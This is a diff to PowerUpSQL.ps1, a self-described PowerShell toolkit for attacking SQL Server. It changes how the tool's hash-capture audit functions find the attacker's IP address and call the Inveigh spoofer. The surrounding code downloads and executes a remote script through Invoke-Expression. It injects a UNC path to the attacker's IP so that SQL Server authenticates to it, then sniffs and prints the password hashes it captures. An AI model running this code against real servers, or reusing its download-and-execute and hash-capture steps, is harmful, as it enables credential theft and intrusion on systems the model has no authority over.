@@ -4,7 +4,7 @@
         File: PowerUpSQL.ps1
         Author: Scott Sutherland (@_nullbind), NetSPI - 2016
         Contributors: Antti Rantasaari and Eric Gruber
-        Version: 1.0.0.7
+        Version: 1.0.0.8
         Description: PowerUpSQL is a PowerShell toolkit for attacking SQL Server.
         License: BSD 3-Clause
         Required Dependencies: PowerShell v.3
@@ -10126,14 +10126,20 @@ Author        : Scott Sutherland (@_nullbind), NetSPI 2016
                     {
                         $IsExploitable  = 'Yes' 
 
-                        If (-NOT ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] “Administrator”))
-                        {
+                        # Check if the current process has elevated privs
+                        # https://msdn.microsoft.com/en-us/library/system.security.principal.windowsprincipal(v=vs.110).aspx
+                        $CurrentIdentity=[System.Security.Principal.WindowsIdentity]::GetCurrent()
+                        $prp=new-object System.Security.Principal.WindowsPrincipal($CurrentIdentity)
+                        $adm=[System.Security.Principal.WindowsBuiltInRole]::Administrator
+                        $IsAdmin=$prp.IsInRole($adm)
+                        if (-not $IsAdmin)
+                         {
                             Write-Verbose -Message "$Instance : - You do not have Administrator rights. Run this function as an Administrator in order to load Inveigh.”
                             $IAMADMIN = 'No'
-                        }else{
+                         }else{
                             Write-Verbose -Message "$Instance : - You have Administrator rights. Inveigh will be loaded.”
                             $IAMADMIN = 'Yes'
-                        }
+                         }
 
                         # Check for exploit flag
                         if($IAMADMIN -eq 'Yes')
@@ -10141,6 +10147,19 @@ Author        : Scott Sutherland (@_nullbind), NetSPI 2016
                             # Attempt to load Inveigh from file
                             #$InveighSrc = Get-Content .\scripts\Inveigh.ps1 -ErrorAction SilentlyContinue | Out-Null
                             #Invoke-Expression($InveighSrc)
+
+                            # Get IP of current system
+                            if(-not $AttackerIp)
+                            {
+                                $AttackerIp = (Test-Connection -ComputerName 127.0.0.1 -Count 1 |
+                                Select-Object -ExpandProperty Ipv4Address |
+                                Select-Object -Property IPAddressToString -ExpandProperty IPAddressToString)
+
+                                if($AttackerIp -eq "127.0.0.1"){
+                                    $AttackerIp = Get-WmiObject win32_networkadapterconfiguration -filter "ipenabled = 'True'" -ComputerName $env:COMPUTERNAME | 
+                                    Select-Object -First 1 @{Name = "IPAddress";Expression = {[regex]$rx = "(\d{1,3}(\.?)){4}"; $rx.matches($_.IPAddress)[0].Value}} | Select-Object IPaddress -ExpandProperty IPAddress -First 1
+                                }
+                             }
 
                             # Attempt to load Inveigh via reflection
                             Invoke-Expression -Command (New-Object -TypeName system.net.webclient).downloadstring('https://raw.githubusercontent.com/Kevin-Robertson/Inveigh/master/Scripts/Inveigh.ps1')
@@ -10155,15 +10174,8 @@ Author        : Scott Sutherland (@_nullbind), NetSPI 2016
                                 
                                 # Start sniffing for hashes from that IP
                                 Write-Verbose -Message "$Instance : - Start sniffing..." 
-                                Invoke-Inveigh -SpooferHostsReply $InstanceIP -HTTP N -NBNS Y -MachineAccounts Y -WarningAction SilentlyContinue | Out-Null
+                                Invoke-Inveigh -HTTP N -NBNS Y -MachineAccounts Y -WarningAction SilentlyContinue -IP $AttackerIp | Out-Null
 
-                                # Get IP of current system
-                                if(-not $AttackerIp)
-                                {
-                                    $AttackerIp = (Test-Connection -ComputerName 127.0.0.1 -Count 1 |
-                                    Select-Object -ExpandProperty Ipv4Address |
-                                    Select-Object -Property IPAddressToString -ExpandProperty IPAddressToString)
-                                }
 
                                 # Sent unc path to attacker's Ip
                                 Write-Verbose -Message "$Instance : - Inject UNC path to \\$AttackerIp\path..."
@@ -10171,7 +10183,7 @@ Author        : Scott Sutherland (@_nullbind), NetSPI 2016
                                 
                                 # Stop sniffing and print password hashes
                                 Start-Sleep $TimeOut
-                                $null = Stop-Inveigh 
+                                Stop-Inveigh | Out-Null 
                                 Write-Verbose -Message "$Instance : - Stopped sniffing." 
                                 
                                 $HashType = ''
@@ -10439,13 +10451,32 @@ Function Invoke-SQLAuditPrivXpFileexist
                     {
                         $IsExploitable  = 'Yes' 
 
-                        If (-NOT ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator"))
-                        {
+                        # Check if the current process has elevated privs
+                        # https://msdn.microsoft.com/en-us/library/system.security.principal.windowsprincipal(v=vs.110).aspx
+                        $CurrentIdentity=[System.Security.Principal.WindowsIdentity]::GetCurrent()
+                        $prp=new-object System.Security.Principal.WindowsPrincipal($CurrentIdentity)
+                        $adm=[System.Security.Principal.WindowsBuiltInRole]::Administrator
+                        $IsAdmin=$prp.IsInRole($adm)
+                        if (-not $IsAdmin)
+                         {
                             Write-Verbose -Message "$Instance : - You do not have Administrator rights. Run this function as an Administrator in order to load Inveigh.”
                             $IAMADMIN = 'No'
-                        }else{
+                         }else{
                             Write-Verbose -Message "$Instance : - You have Administrator rights. Inveigh will be loaded.”
                             $IAMADMIN = 'Yes'
+                         }
+
+                        # Get IP of current system
+                        if(-not $AttackerIp)
+                        {
+                            $AttackerIp = (Test-Connection -ComputerName 127.0.0.1 -Count 1 |
+                            Select-Object -ExpandProperty Ipv4Address |
+                            Select-Object -Property IPAddressToString -ExpandProperty IPAddressToString)
+
+                            if($AttackerIp -eq "127.0.0.1"){
+                                $AttackerIp = Get-WmiObject win32_networkadapterconfiguration -filter "ipenabled = 'True'" -ComputerName $env:COMPUTERNAME | 
+                                Select-Object -First 1 @{Name = "IPAddress";Expression = {[regex]$rx = "(\d{1,3}(\.?)){4}"; $rx.matches($_.IPAddress)[0].Value}} | Select-Object IPaddress -ExpandProperty IPAddress -First 1
+                            }
                         }
 
                         # Check for exploit flag
@@ -10468,15 +10499,7 @@ Function Invoke-SQLAuditPrivXpFileexist
                                 
                                 # Start sniffing for hashes from that IP
                                 Write-Verbose -Message "$Instance : - Start sniffing..." 
-                                Invoke-Inveigh -SpooferHostsReply $InstanceIP -NBNS Y -MachineAccounts Y -WarningAction SilentlyContinue | Out-Null
-
-                                # Get IP of current system
-                                if(-not $AttackerIp)
-                                {
-                                    $AttackerIp = (Test-Connection -ComputerName 127.0.0.1 -Count 1 |
-                                        Select-Object -ExpandProperty Ipv4Address |
-                                    Select-Object -Property IPAddressToString -ExpandProperty IPAddressToString)
-                                }
+                                Invoke-Inveigh -HTTP N -NBNS Y -MachineAccounts Y -WarningAction SilentlyContinue -IP $AttackerIp | Out-Null
 
                                 # Sent unc path to attacker's Ip
                                 Write-Verbose -Message "$Instance : - Inject UNC path to \\$AttackerIp\path..."
@@ -10484,7 +10507,7 @@ Function Invoke-SQLAuditPrivXpFileexist
                                 
                                 # Stop sniffing and print password hashes
                                 Start-Sleep $TimeOut
-                                $null = Stop-Inveigh 
+                                Stop-Inveigh | Out-Null
                                 Write-Verbose -Message "$Instance : - Stopped sniffing." 
                                 
                                 $HashType = ''
